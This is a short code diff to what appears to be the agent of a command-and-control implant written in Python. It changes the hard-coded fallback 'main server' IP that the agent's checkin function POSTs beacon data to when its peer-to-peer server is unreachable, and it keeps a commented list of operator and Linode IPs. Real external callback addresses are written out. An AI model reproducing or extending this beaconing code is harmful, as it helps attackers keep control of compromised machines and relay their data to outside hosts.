@@ -29,7 +29,7 @@ delegates_UUID = []
 delegates_aswers = []
 result = {}
 
-# my ip 87.20.204.131
+# my ip 87.3.200.118
 # linode 194.195.242.157
 # linode 172.104.135.23
 # linode 172.104.135.67
@@ -114,7 +114,7 @@ def checkin(agent):
             x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
         except:
             print("[P2P server not found. Switching to main server]")
-            agent.Server = "http://87.20.204.131"
+            agent.Server = "http://87.3.200.118"
             agent.Port = "80"
             x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
     res = from64(x.text)
